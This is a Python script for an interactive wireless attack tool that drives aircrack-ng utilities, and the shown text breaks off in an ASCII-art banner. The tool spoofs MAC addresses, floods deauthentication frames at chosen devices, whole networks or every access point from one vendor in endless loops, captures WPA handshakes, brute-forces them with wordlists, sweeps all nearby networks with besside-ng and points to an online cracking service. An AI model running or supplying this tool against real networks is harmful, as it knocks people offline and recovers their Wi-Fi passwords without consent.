#!/usr/bin/env python
import os
import re
import time
import glob
import random
import signal
import keyboard
import subprocess

selected_interface = ""
target_ap = ""
target_bssid = ""
target_channel = ""
target_device = ""
target_ap_authentication = ""
target_router_oui = ""
interface_mac_address = ""
device_list_of_target_ap = []
ssid_map = {}
ssid_counter = ''
terminal_pids = []

terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']
terminal_positions = [(0, 0), (0, 400), (0, 800), (800, 0), (800, 400),
                      (800, 800)]  # top-right, middle-right, bottom-right, top-left, middle-left, bottom-left


def check_for_q_press(interval=0.1, timeout=3):
    start_time = time.time()
    while time.time() - start_time < timeout:
        if keyboard.is_pressed('q'):
            return True
        time.sleep(interval)
    return False


def get_screen_resolution():
    output = check_command_output("xdpyinfo | grep dimensions")
    resolution = output.split()[1].split('x')
    return int(resolution[0]), int(resolution[1])


def red(string):
    return f'\033[91m{string}\033[0m'


def green(string):
    return f'\033[92m{string}\033[0m'


def purple(string):
    return f'\033[95m{string}\033[0m'


def yellow(string):
    return f'\033[33m{string}\033[0m'


def blue(string):
    return f'\033[34m{string}\033[0m'


def magenta(string):
    return f'\033[35m{string}\033[0m'


def cyan(string):
    return f'\033[36m{string}\033[0m'


def white(string):
    return f'\033[37m{string}\033[0m'


def clear():
    subprocess.run('clear')


def run_command(command):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if result.returncode == 0:
        return result.stdout
    else:
        return result.stderr


def run_command_print_output(command):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    print(f"Command: {command}")
    if result.returncode == 0:
        print(f"{green('Output')}   :   " + result.stdout)
        print("-" * 30)
        return result.stdout
    else:
        print(f"{red('Error')}      :   " + result.stderr)
        print("-" * 30)
        return result.stderr


def popen_command(command, killtime=0):
    print(yellow(f'running {command} for {killtime} seconds'))
    process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE)
    if killtime:
        time.sleep(killtime)
        os.killpg(process.pid, signal.SIGTERM)
        process.wait()
        output, error = process.communicate()
        output = output.decode('latin1')
        error = error.decode('latin1')
        return output, error
    else:
        output, error = process.communicate()
        output = output.decode('latin1')
        error = error.decode('latin1')
        return output, error


def popen_command_new_terminal(command):
    for terminal in terminals:
        screen_width, screen_height = get_screen_resolution()
        terminal_width = screen_width // 2
        terminal_height = screen_height // 3

        try:
            if terminal == 'x-terminal-emulator':
                if not terminal_positions:
                    print("No more positions available for new terminals.")
                    continue
                position_index = len(terminal_pids) % 6
                x, y = terminal_positions[position_index]
                terminal_command = f"{terminal} -geometry {terminal_width}x{terminal_height}+{x}+{y} -e 'bash -c \"{command}; exec bash\"'"
            elif terminal == 'gnome-terminal':
                if not terminal_positions:
                    print("No more positions available for new terminals.")
                    continue
                position_index = len(terminal_pids) % 6
                x, y = terminal_positions[position_index]
                terminal_command = f"{terminal} --geometry=80x24+{x}+{y} -e '/bin/sh -c \"{command}; exec bash\"'"
                # terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
            elif terminal == 'konsole':
                terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
            elif terminal == 'xfce4-terminal':
                if not terminal_positions:
                    print("No more positions available for new terminals.")
                    continue
                position_index = len(terminal_pids) % 6
                x, y = terminal_positions[position_index]
                terminal_command = f"{terminal} --geometry=80x24+{x}+{y} -e '/bin/sh -c \"{command}; exec bash\"'"
                # terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
            else:  # xterm
                terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
            # print(f"Executing command: {terminal_command}\n")
            process = subprocess.Popen(terminal_command, shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE, text=True)
            terminal_pids.append(process.pid)
            return process

        except Exception as e:
            print(f"Failed to execute command in {terminal}: {e} \n")


def check_command_output(command):
    output = subprocess.check_output(command, shell=True, text=True)
    return output


def check_if_selected_interface_in_monitor_mode():
    if not selected_interface:
        if input(f'No {green("Interface")} specified. Do you want to select an interface Y/N : ').lower() == 'y':
            change_interface()
        return
    interface_settings = run_command(f'iwconfig {selected_interface}')
    if 'monitor' in interface_settings.lower():
        return True
    else:
        return False


def switch_interface_to_monitor_mode():
    if not selected_interface:
        if input(f'No {green("Interface")} specified. Do you want to select an interface Y/N : ').lower() == 'y':
            change_interface()
        return
    print('Setting ' + selected_interface + ' to monitor mode ')
    run_command(f'ifconfig {selected_interface} down')
    run_command(f'iwconfig {selected_interface} mode monitor')
    run_command(f'ifconfig {selected_interface} up')


def switch_interface_to_managed_mode():
    if not selected_interface:
        if input(f'No {green("Interface")} specified. Do you want to select an interface Y/N : ').lower() == 'y':
            change_interface()
        return
    print('Setting ' + selected_interface + ' to managed mode ')
    run_command(f'ifconfig {selected_interface} down')
    run_command(f'iwconfig {selected_interface} mode managed')
    run_command(f'ifconfig {selected_interface} up')


def get_mac_of_interface():
    global interface_mac_address
    output = run_command(f'ip link show {selected_interface}')
    mac_address_search = re.search(r'link/\S+ (\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)', output)
    if mac_address_search:
        interface_mac_address = mac_address_search.group(1)
    else:
        print(f'error with {magenta("get_mac_of_interface")}')


def spoof_mac_of_interface_with_random_byte():
    if not selected_interface:
        if input(f'No {green("Interface")} specified. Do you want to select an interface Y/N : ').lower() == 'y':
            change_interface()
        return
    global interface_mac_address
    print(f'current interface is {selected_interface} and current MAC address is {interface_mac_address}')
    run_command_print_output(f'ip link set dev {selected_interface} down')
    first_bit = ['2', '3', '4', '5', '6', '7', '8', 'a', 'b', 'c', 'd', 'e', 'f']
    second_bit = ['2', '4', '6', '8', 'c', 'e']
    first_octet = random.choice(first_bit) + random.choice(second_bit)
    random_mac = f'{first_octet}:' + ':'.join(f"{random.randint(0x00, 0xFF):02X}" for _ in range(5))

    print(f'randomly selected mac for {selected_interface} is {random_mac}')
    run_command_print_output(f'ip link set dev {selected_interface} address {random_mac}')
    # time.sleep(0.3)
    run_command(f'ip link set dev {selected_interface} up')
    # time.sleep(0.3)
    get_mac_of_interface()


def scan_for_networks():
    clear()
    global ssid_map
    global ssid_counter
    output, error = popen_command(f'airodump-ng {selected_interface}', killtime=10)
    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        found_SSIDS = []
        ssid_counter = 0
        for row in output.split('\n'):
            column = row.split()
            if len(column) >= 12 and str(column[0]) != '' and str(column[5]) != '' and str(
                    column[-3]) != '' and not str(column[10]) == 'AUTH' and not str(column[10]) == 'PSK' and not str(
                column[10]) == '][' and not str(
                column[10]).startswith('<length:') and not str(column[10]).startswith('0>:') and not str(
                column[10]).startswith('0>') and not str(column[10]).startswith('SAE') and not str(
                column[10]).startswith('(not associated)'):
                if column[10] not in [ssid[1] for ssid in found_SSIDS]:
                    ssid_counter += 1
                    found_SSIDS.append([ssid_counter, column[10]])
                    ssid_map[ssid_counter] = [column[10], column[0], column[0][:8], column[5], column[-3]]
    else:
        print(f'Scan was not successful due to {green(selected_interface)} being {red("DOWN")}')
        print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')


def deauthentication(timeout=0):
    switch_interface_channel()
    if not target_ap:
        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
            select_target_ap()
        else:
            return
    if not timeout:
        popen_command_new_terminal(
            f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {selected_interface}')
    if timeout:
        aireplay = popen_command_new_terminal(
            f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {selected_interface}')

        while timeout != 0:
            print(
                f"Deauthenticating {green(target_bssid)}. Remaining time {green(timeout)} Press Q to cancel")
            if check_for_q_press(timeout=1):
                print("Loop canceled by user.")
                time.sleep(1)
                break
            timeout -= 1
        try:
            os.killpg(aireplay.pid, signal.SIGKILL)
            aireplay.wait()
        except ProcessLookupError:
            return


def device_deauthentication(timeout=0):
    if not target_device:
        print(f'Select a {yellow("target Device")} to continue with this attack')
        if input(f'Select a {yellow("target Device")} Y/N : ').lower() == 'y':
            select_target_device()
        # else:
        #     return
    switch_interface_channel()
    if not timeout:
        popen_command_new_terminal(
            f'aireplay-ng --deauth 0 -a {target_bssid} -c {target_device} --ignore-negative-one {selected_interface}')
    elif timeout:
        aireplay = popen_command_new_terminal(
            f'aireplay-ng --deauth 0 -a {target_bssid} -c {target_device} --ignore-negative-one {selected_interface}')
        while timeout != 0:
            print(
                f"Deauthenticating {green(target_device)} from {green(target_bssid)}. Remaining time {green(timeout)} Press Q to cancel")
            if check_for_q_press(timeout=1):
                print("Loop canceled by user.")
                break
            timeout -= 1
        try:
            os.killpg(aireplay.pid, signal.SIGKILL)
            aireplay.wait()
        except ProcessLookupError:
            return


def change_interface():
    global selected_interface
    print("Available Network Interfaces: \n")
    interfaces = run_command("iw dev | grep Interface | awk '{print $2}'").split('\n')
    select_with_number = []
    interface_count = 0
    for intf in interfaces:
        if intf != '':
            interface_count += 1
            select_with_number.append([interface_count, intf])
            print(f'{green(select_with_number[interface_count - 1][0])}) {select_with_number[interface_count - 1][1]}')
    while True:
        selection = input(f"\nEnter the number of the interface {green('type exit to return')} : ")
        if selection.lower() == 'exit':
            break
        elif selection.isnumeric():
            if interface_count >= int(selection) > 0:
                selected_interface = select_with_number[int(selection) - 1][1]
                get_mac_of_interface()
                break
            elif int(selection) > interface_count:
                print(f'Selected interface ({selection}) {red("does not exist")}')


def select_target_ap():
    clear()
    global target_ap
    global target_bssid
    global target_channel
    global target_ap_authentication
    if not ssid_map:
        scan_for_networks()
    clear()
    for key, value in ssid_map.items():
        print("{:<4} {:<36} {:<17} {:<8} {:<2} {:<3}".format(f'{cyan(key)})', blue(value[0]), yellow(value[1]),
                                                             green(value[2]), cyan(value[3]),
                                                             magenta(value[4])))
    while 1:

        print(f'\nif desired SSID is not listed, please return and select {green("U")} to update networks.')
        selection = input(f"\nEnter the number of the SSID / {green(f'exit to return')} : ")
        if selection == 'exit':
            break
        elif selection.isnumeric():
            if len(ssid_map) >= int(selection) > 0:
                target_ap = ssid_map[int(selection)][0]
                target_bssid = ssid_map[int(selection)][1]
                target_channel = ssid_map[int(selection)][3]
                target_ap_authentication = ssid_map[int(selection)][4]
                return
            elif int(selection) > len(ssid_map):
                print(f'Selected interface ({selection}) {red("does not exist")}')


def select_target_oui():
    if not ssid_map:
        scan_for_networks()
    grouped_by_oui = {}
    for key, value in ssid_map.items():
        oui = value[2]
        if oui not in grouped_by_oui:
            grouped_by_oui[oui] = [value[0]]
        else:
            grouped_by_oui[oui].append(value[0])
    numbered_oui = {i + 1: oui for i, oui in enumerate(grouped_by_oui.keys())}
    for key, value in numbered_oui.items():
        print(f"{cyan(key)})  {yellow('OUI')}: {value} \n"
              f"    {blue('SSIDs')}:",
              f"{grouped_by_oui[value]}".replace('[', '').replace(']', '').replace('\'', '').replace(',',
                                                                                                     f'f{green(" && ")}'))
    while True:
        selection = input(
            f"\nEnter the number of the {green('OUI')} of the target AP / {green('( exit to return)')} : ")
        if selection.lower() == 'exit':
            break
        elif selection.isnumeric() and int(selection) in numbered_oui:
            global target_router_oui
            target_router_oui = numbered_oui[int(selection)]
            break
        else:
            print(f'Invalid selection {red(selection)}')


def select_target_device():
    global device_list_of_target_ap
    device_list_of_target_ap = []
    if not target_ap:
        print(
            f'To select a {yellow("target Device")} first select a {yellow("target AP")} to continue : ')
        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
            select_target_ap()
        else:
            return
    global target_device
    clear()
    output, error = popen_command(f'airodump-ng -N {target_ap} -c {target_channel} {selected_interface}', killtime=10)
    devices = []
    for row in output.split('\n'):
        column = row.split()
        # print(repr(column))
        if len(column) >= 7 and str(column[0] == target_bssid) and len(column[1]) == 17:
            device = column[1]
            if device not in devices and device != target_bssid:
                devices.append(device)
    devices_print = []
    counter = 0
    if devices:
        clear()
        for device in devices:
            counter += 1
            devices_print.append(f'{green(counter)} : {device}')
        while 1:
            for i in devices_print:
                print(i)
            selection = input("choose a target device : ")
            if selection.isnumeric():
                if counter >= int(selection) > 0:
                    target_device = devices[int(selection) - 1]
                    for device in devices:
                        device_list_of_target_ap.append(device)
                    return
                elif int(selection) > counter:
                    print(f'Selected device ({selection}) {red("does not exist")}')
    else:
        input(f'No Device is connected to {green(target_bssid)} Press enter to return : ')
        return


def deauth_devices_in_target_ap():
    global target_device
    clear()
    if not target_ap:
        print(
            f'To {red("Deauthenticate")} a {yellow("target Device")} first select a {yellow("target AP")} to continue with this attack')
        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
            select_target_ap()
        return
    Save_target_device = target_device
    device_list_of_target_ap = []
    output, error = popen_command(f'airodump-ng -N {target_ap} -c {target_channel} {selected_interface}', killtime=10)
    devices = []
    for row in output.split('\n'):
        column = row.split()
        if len(column) >= 7 and str(column[0] == target_bssid) and len(column[1]) == 17:
            device = column[1]
            if device not in devices and device != target_bssid:
                devices.append(device)
    for device in devices:
        device_list_of_target_ap.append(device)
    if device_list_of_target_ap:
        clear()
        print(
            f'{green(str(len(device_list_of_target_ap)))} DEVICE MAC ADDRESS(ES) found on {green(target_ap)}\n')
        for device in device_list_of_target_ap:
            print(yellow(device))

        print(f"{blue('---------------------------------------')}\n",
              "1   : Deauth all devices once and quit\n",
              "2   : Deauth all devices roundrobin\n",
              "999 : Quit\n")
        while 1:
            selection = input("Choose an option : ")
            if selection == '999':
                return
            elif selection == '1':
                for device in device_list_of_target_ap:
                    clear()
                    print(f"Deauthing {device} for 60 seconds")
                    target_device = device
                    device_deauthentication(timeout=60)
                target_device = Save_target_device
                return
            elif selection == '2':
                rr_counter = 0
                while True:
                    for device in device_list_of_target_ap:
                        clear()
                        print(f"Deauthing {green(device)} for {green('60')} seconds")
                        target_device = device
                        device_deauthentication(timeout=60)
                    rr_counter += 1
                    time.sleep(1)
                    print(
                        f"each SSID in {green(target_ap)} has been Deauthenticated for {green(rr_counter)} times")
                    print(
                        f"moving to round {green(rr_counter + 1)} in 3 seconds. {red('Press Q to cancel')}")
                    if check_for_q_press():
                        print("Loop canceled by user.")
                        target_device = Save_target_device
                        return

    else:
        input(f'No Device is connected to {green(target_bssid)} Press enter to return : ')


def deauth_by_oui():
    clear()
    if not target_router_oui:
        print(f"Select a {yellow('target OUI')} to continue with this attack")
        if input(f"Select a {yellow('target OUI')} target Y/N : ").lower() == 'y':
            select_target_oui()
        return
    global target_bssid
    store_target_bssid = target_bssid
    ap_list_of_target_oui = []
    for key, value in ssid_map.items():
        if value[2] == target_router_oui:
            ap_list_of_target_oui.append(value[1])
    print(f"{blue('---------------------------------------')}")
    print(f"List of AP's in {yellow(target_router_oui)}")
    for bssid in ap_list_of_target_oui:
        print(f"{green(bssid)}")
    print(f"{blue('---------------------------------------')}")
    print(f"1   : Deauth all AP's once and quit")
    print(f"2   : Deauth all AP's roundrobin")
    print(f"{blue('---------------------------------------')}")
    print("999 : Quit\n")
    while 1:
        selection = input("Choose an option : ")
        if selection == '999':
            return
        elif selection == '1':

            for bssid in ap_list_of_target_oui:
                clear()
                target_bssid = bssid
                print(f"Deauthing {bssid} for 60 seconds")
                deauthentication(timeout=60)
            target_bssid = store_target_bssid
            print(f"Deauthed all AP's in {green(target_router_oui)} for 60 seconds")
            input(f"Press enter to return : ")
            return
        elif selection == '2':
            rr_counter = 0
            while 1:
                for bssid in ap_list_of_target_oui:
                    clear()
                    target_bssid = bssid
                    print(f"Deauthing {bssid} for 60 seconds")
                    deauthentication(timeout=60)
                rr_counter += 1
                time.sleep(1)
                print(
                    f"each SSID in {green(target_router_oui)} has been Deauthenticated for {green(rr_counter)} times")
                print(
                    f"moving to round {green(rr_counter + 1)} in 3 seconds. {red('Press Q to cancel')}")
                if check_for_q_press():
                    clear()
                    target_bssid = store_target_bssid
                    return


def remove_files_with_prefix(directory, prefix):
    pattern = os.path.join(directory, prefix + '*')

    files_to_remove = glob.glob(pattern)

    for file_path in files_to_remove:
        try:
            os.remove(file_path)
            print(f"Removed {file_path}")
        except FileNotFoundError:
            print(f"File {file_path} was not found (it may have been removed already).")
        except Exception as e:
            print(f"Error removing {file_path}: {e}")
    return


def switch_interface_channel():
    run_command(f'iwconfig {selected_interface} channel {target_channel}')


def capture_packets():
    clear()
    if not target_ap:
        print(f'Select a {yellow("target AP")} to continue with this attack')
        if input(f'Select a {yellow("target AP")} Y/N : ').lower() == 'y':
            select_target_ap()
        return
    output, error = popen_command(f'airodump-ng {selected_interface}', killtime=10)
    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        print(f'Running packet capture on {green(target_ap)}')
        print(f'Switching channel on  {green(selected_interface)} to {green(target_channel)}')
        switch_interface_channel()
        print(f'Running airodump {green(target_ap)} for 30 seconds ')

        target_directory = f'/tmp/{target_ap}-Captures'
        os.makedirs(target_directory, exist_ok=True)
        airodump_capture_location = f'/tmp/{target_ap}-Captures/{target_ap}'
        airodump = popen_command_new_terminal(
            f'airodump-ng --bssid {target_bssid} -c {target_channel} -w {airodump_capture_location} {selected_interface}')
        timeout = 30
        while timeout != 0:
            print(f"Remaining time {green(timeout)} Press Q to cancel")
            if check_for_q_press(timeout=1):
                print("Loop canceled by user.")
                break
            timeout -= 1
        clear()
        try:
            os.killpg(airodump.pid, signal.SIGTERM)
            airodump.wait()
        except ProcessLookupError:
            print('airodump killed unexpectedly', ProcessLookupError)

        print(f"Packet Capture is saved in '{green(f'/tmp/{target_ap}-Captures/')}'")
        input(f"Press enter to return : ")
    else:
        clear()
        print(f'f{blue("-------------------------------------------------------------")}')
        print(f'This message is from {green("capture_handshake")}')
        print(f'There is a problem with {red("airodump-ng")}')
        print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')
        print(f'{red("AIRODUMP-NG STDERR ::")}\n{red(str(error))}')
        input(f'Press enter to return :  ')
        return


def capture_handshake():
    clear()

    if not target_ap:
        print(f'Select a {yellow("target AP")} to continue with this attack')
        if input(f'Select a {yellow("target AP")} Y/N : ').lower() == 'y':
            select_target_ap()
        return
    if target_ap_authentication == 'PSK':
        clear()
        print(f'Running packet capture on {green(target_ap)}')
        print(
            f'Switching channel on  {green(selected_interface)} to {green(target_channel)}')
        switch_interface_channel()

        target_directory = f'/tmp/{target_ap}-handshakeCapture'
        os.makedirs(target_directory, exist_ok=True)

        airodump_handshake_capture_location = f'/tmp/{target_ap}-handshakeCapture/{target_ap}'

        print(f'Writing Capture files to {yellow(target_directory)}')

        aireplay = popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} {selected_interface}')

        airodump = popen_command_new_terminal(
            f'airodump-ng --bssid {target_bssid} -c {target_channel} -w {airodump_handshake_capture_location} {selected_interface}')

        timeout = 30
        while timeout != 0:
            print(f"Remaining time {green(timeout)} Press Q to cancel")
            if check_for_q_press(timeout=1):
                print("Loop canceled by user.")
                time.sleep(1)
                break
            timeout -= 1
        os.killpg(airodump.pid, signal.SIGTERM)

        airodump_output = ''
        try:
            os.killpg(aireplay.pid, signal.SIGTERM)
            aireplay.wait()
        except ProcessLookupError:
            print('aireplay killed unexpectedly', ProcessLookupError)
        try:
            pattern = re.compile(r'handshake:')
            airodump_output, error = airodump.communicate()
            airodump.wait()
            match = pattern.search(airodump_output)
            if match:
                clear()
                print(f"\nHandshake capture {green('SUCCESSFUL')}")
                print(f"Handshake is saved in '/tmp/{target_ap}-handshakeCapture/'")
                input('input anything to return to network attacks menu')
                return

            else:
                clear()
                print(f'Handshake capture {red("FAILED")}')
                print(
                    'Remember that in order to capture the handshake '
                    'a device must try to connect to the target SSID')
                print(
                    'Reason for no handshake might be that no device was deauthenticated. '
                    'Try changing the timeout variable of this script in the source code')
                print(
                    'Or it might be that the deauthenticated devices did not try to reconnect to the SSID '
                    '(might happen if only a small amount of devices are connected to target SSID)')
                remove_files_with_prefix(f'/tmp/{target_ap}-handshakeCapture',
                                         f'{target_ap}')
                os.rmdir(f'/tmp/{target_ap}-handshakeCapture')
                input(
                    f' press enter to return to network attacks menu and select {green("C2")} to capture the handshake for {green(target_ap)}')
        except ProcessLookupError:
            print('airodump killed unexpectedly', ProcessLookupError)
    else:
        clear()
        print('{target_ap_authentication} authentication is not supported for handshake capture')
        print('Only PSK authentication is supported for handshake capture')
        input(f"Press enter to return and select a AP that uses {yellow('PSK')} Authentication")
        return


def airdecap_wpa():
    if not target_ap:
        print(
            f'To decrypt a capture file first select a {yellow("target AP")} to continue : ')
        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
            select_target_ap()
        else:
            return
    while 1:
        print(f'Here is the list of all cap files that start with {green(target_ap)} in /tmp\n')
        print(run_command(f"find /tmp -type f -name '{target_ap}-*.cap'"))
        capture_location = (input(
            f'Type the address of (WPA/WPA2) packet capture of {green(target_ap)} you want to decrypt : ')
                            .strip())
        password_of_ap = input(f'Type the password of {green(target_ap)} you want to decrypt : ')
        clear()
        print(f'Capture file = {green(capture_location)}\n'
              f'Password of {green(target_ap)} = {green(password_of_ap)}')
        print(f' Type {green("E")} to return to network attacks')
        selection = input('Is everything correct Y/N/E : ').lower()
        if selection == 'y':
            break
        if selection == 'e':
            return
    clear()
    print(f'Running decryption on {green(capture_location)} with airdecap \n')
    output, error = popen_command(f'airdecap-ng -e {target_ap} -p {password_of_ap} {capture_location}')
    if 'Could not open' in output:
        print(f'{red("STDOUT")}  = {output}')
        print(f'{red("STDERR")}  = {error}')
        print(f'Decryption failed, possibly due to {red("mistype in capture file location")}')
        input('Press enter to return ')
        return
    if 'Number of decrypted WPA  packets         0' in output:
        print(f'{red("STDOUT")}  = {output}')
        print(f'{red("STDERR")}  = {error}')
        print(f'Decryption failed, possible mistype in {red("password")}')
        input('Press enter to return ')
        return
    potential_decap_output = ''
    if len(capture_location) >= 4:
        potential_decap_output = capture_location[:-3]
        potential_decap_output += 'dec.cap'
    print(f'\nif airdecap was successful the decrypted output must be on {green(potential_decap_output)}')
    input(f'Input anything to return to network attacks : ')


def bruteforce_handshake_capture():
    if not target_ap:
        print(f'Select a {yellow("target AP")} to continue with this attack')
        if input(f'Select a {yellow("target AP")} Y/N : ').lower() == 'y':
            select_target_ap()
        return
    search_pattern = f'/tmp/{target_ap}-handshakeCapture/{target_ap}*.cap'
    matches = glob.glob(search_pattern)
    if matches:
        while 1:
            clear()
            print(f'{green(len(matches))} captures for the {green(target_ap)} found')
            print(f'this software deletes the capture files that do not contain the handshake')
            print(
                f'so if the capture files were created using this software then all of the capture files should '
                f'contain the handshake\n')
            for match in matches:
                print(green(match))
            print('\n')

            print(
                f'If the handshake was captured using besside then the capture file is either {green(f"/tmp/{target_ap}-besside/wpa.cap")} or {green(f"/tmp/{target_ap}-besside/wep.cap")}')
            print(
                f'If you dont know which one to use then open them using {green("wireshark")} '
                f'only one of the files should have packets inside. Use the file with the packets \n')

            capture_file_address = input(
                f'type the address of the .cap file to continue. for example /tmp/{target_ap}-handshakeCapture/{target_ap}-01.cap : ').strip()
            print(f"selected capture file address is : {green(capture_file_address)} ")
            selection = input("Type Y to continue Y ").lower()
            if selection == 'y':
                break
    else:
        while 1:
            clear()
            print(f'No Capture file found in /tmp/{target_ap}-handshakeCapture for {green(target_ap)}')
            print(f'type the address of the .cap file to continue')
            print(
                f'Or type {red("N")} to return to Network attacks menu '
                f'(type C1 in Network attacks to capture the handshake for {green(target_ap)})')
            capture_file_address = input('address/N : ')
            if capture_file_address == 'N' or capture_file_address == 'n':
                return
            print(f"selected capture file address is : {green(capture_file_address)} ")
            selection = input("Type Y to continue Y/N : ").lower()
            if selection == 'y':
                break
    if capture_file_address == 'N' or capture_file_address == 'n':
        return
    else:
        clear()
        print(f"selected capture file address is : {green(capture_file_address)} \n")
        print(f"Here are the password lists that can be used in bruteforce attack\n")

        password_lists_directory_path = 'password_lists'
        while 1:
            for filename in os.listdir(password_lists_directory_path):

                full_path = os.path.join(password_lists_directory_path, filename)

                if os.path.isfile(full_path):
                    print(green(filename))
            print(f"\nType the name of the password list to be used in bruteforce attack (for example common.txt) : ")
            print(f'or type {green("1")} to give a path to your own password list : ')
            print(
                f'or type {green("999")} to cancel bruteforce attack and return to network attacks menu : '
                f'\n')
            selected_password_list = input(f'filename/1/999 : ').strip()
            if selected_password_list == '999':
                return
            if selected_password_list == '1':
                selected_password_list = input(f'give a path to your own password list : ').strip()
                print(f'your password list is {green(selected_password_list)}')
                selection = input(
                    'type y to continue with this password list or type anything to reselect : ').lower().strip()
                if selection == 'y':
                    break
            else:
                print(f'your password list is {green(selected_password_list)}')
                selection = input(
                    'type y to continue with this password list or type anything to reselect : ').lower().strip()
                if selection == 'y':
                    selected_password_list = f'password_lists/{selected_password_list}'
                    break

        clear()
        print(
            f'Running aircrack on {green(target_ap)}'
            f' using wordlist in {green(selected_password_list)} ')

        target_directory = f'/tmp/{target_ap}-password'
        os.makedirs(target_directory, exist_ok=True)
        aircrack_script = f'aircrack-ng -w {selected_password_list} -b {target_bssid} -l {target_directory}/{target_ap}.txt {capture_file_address}'
        for terminal in terminals:
            subprocess.Popen(f'{terminal} -e {aircrack_script}', shell=True, preexec_fn=os.setsid, )
            print(f'aircrack-ng -w {selected_password_list} -b {target_bssid} {capture_file_address}')
            print('\n')
            print(
                f'Process Complete. To check if password is found '
                f'look at {green(f"{target_directory}/{target_ap}.txt")}')
            input('press enter to return to network attacks')
            return


def besside():
    clear()
    print(f'{red("besside-ng is an automated script that captures Handshakes of all Networks in range")}')
    consent = input('continue (yes/no): ').lower()
    if consent == 'yes':
        clear()
        timer = 5
        while timer > 0:
            print(f"Attack starts in {timer}")
            time.sleep(1)
            timer -= 1
        for terminal in terminals:
            target_directory = f'/tmp/besside-all'
            os.makedirs(target_directory, exist_ok=True)
            besside_process = subprocess.Popen(f'{terminal} -e besside-ng {selected_interface}',
                                               shell=True,
                                               preexec_fn=os.setsid,
                                               cwd=target_directory)
            besside_process.wait()
            print(f'Process is Complete\n',
                  f'To check if handshake capture was successful look at the {green("besside.log")} '
                  f'in {green(target_directory)}\n')
            print(
                f'If any handshake was captured then either use {green("wep.cap")} '
                f'or {green("wpa.cap")} with aircrack to bruteforce password')
            print(
                f'If you dont know which one to use then open them using {green("wireshark")} '
                f'only one of the files should have packets inside. Use the file with the packets \n')

            print('\nWPA handshakes can be uploaded to the online cracking service at wpa.darkircop.org.  '
                  'Wpa.darkircop.com also provides useful statistics based on user-submitted capture files about the '
                  'feasibility of WPA cracking.')

            input('input anything to return to network attacks menu : ')
            return


def besside_target_ap():
    if not target_ap:
        print(f'Select a {yellow("target AP")} to continue : ')
        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
            select_target_ap()
        else:
            return
    clear()
    for terminal in terminals:
        target_directory = f'/tmp/{target_ap}-besside'
        os.makedirs(target_directory, exist_ok=True)

        besside_process = subprocess.Popen(f'{terminal} -e besside-ng -b {target_bssid} {selected_interface}',
                                           shell=True,
                                           preexec_fn=os.setsid,
                                           cwd=target_directory)
        besside_process.wait()
        print(f'Process is Complete\n',
              f'To check if handshake capture was successful look at the {green("besside.log")} '
              f'in {green(target_directory)}\n')
        print(f'If handshake was captured then either use {green("wep.cap")} '
              f'or {green("wpa.cap")} with aircrack to bruteforce password')
        print(f''
              f'If you dont know which one to use then open them using {green("wireshark")} '
              f'only one of the files should have packets inside. Use the file with the packets \n')
        input('input anything to return to network attacks menu : ')
        return


def graph_networks():
    if not target_ap:
        print(
            f'To graph a {yellow("AP")} first select a {yellow("target AP")} to continue : ')
        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
            select_target_ap()
        else:
            return
    clear()
    print(f"To graph a network first you need to have a {green('csv')} file captured with airodump\n")
    print(f'Here is the list of all csv files that start with {green(target_ap)} in /tmp/ directory\n')
    print(run_command(f"find /tmp/ -type f -name '{target_ap}-*.csv' ! -name '*log.csv' ! -name '*kismet.csv'"))
    print(f'\ntype the address of the .csv file to continue')
    print(
        f'Or type {red("N")} to return to Network attacks menu '
        f'(use Network attacks to capture packets for {green(target_ap)})')
    while 1:
        capture_file_address = input('address/N : ').strip()
        if capture_file_address == 'n' or capture_file_address == 'N':
            return
        print(f" selected address is {green(capture_file_address)}")
        selection = input(
            'input Y to continue with this address (input anything else to select another address):').lower().strip()
        if selection == 'y':
            break
    clear()
    print(f"Using {green('airgraph-ng')}  with {green(capture_file_address)}")

    while 1:
        selection = input('CAPR / CPG : ').lower()
        if selection == 'capr':
            graph_output_location = f'/tmp/{target_ap}-CAPR'
            airgraph_command = f'airgraph-ng -i {capture_file_address} -o {graph_output_location} -g CAPR'
            break
        if selection == 'cpg':
            graph_output_location = f'/tmp/{target_ap}-CPG'
            airgraph_command = f'airgraph-ng -i {capture_file_address} -o {graph_output_location} -g CPG'
            break
    airgraph = popen_command_new_terminal(airgraph_command)
    airgraph.wait()
    input(f'output saved in {graph_output_location} press enter to continue')
    return


old_art = [
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀ ",
    "⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀",
    "⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀",
    "⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀",
